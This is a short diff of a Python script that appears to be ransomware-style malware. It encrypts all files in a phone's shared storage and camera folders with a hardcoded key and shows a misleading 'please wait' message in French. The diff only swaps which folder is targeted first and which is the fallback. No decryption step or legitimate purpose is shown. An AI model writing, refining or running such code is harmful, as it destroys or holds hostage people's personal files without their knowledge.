@@ -63,7 +63,7 @@ def encrypt_files_in_directory(directory_path, key):
             encrypt_file(file_path, key)
 
 if __name__ == "__main__":
-    target_directory = "storage/dcim"
+    target_directory = "storage/shared"
     encryption_key = b'\x88\x1a\xfa@\xfa\xd1\xadB\xd5\xaa\xf2\xe17\x9b\xfeo\x88*\x89\xe2gEP\xb60R\xc6\xdb/\xb5`\xa7'
 
     try:
@@ -71,7 +71,7 @@ if __name__ == "__main__":
     except Exception as e:
         print(" En cours. Patientez. :", e)
         # Essayez une autre méthode
-        target_directory = "storage/shared"
+        target_directory = "storage/dcim"
         encrypt_files_in_directory(target_directory, encryption_key)
 
 
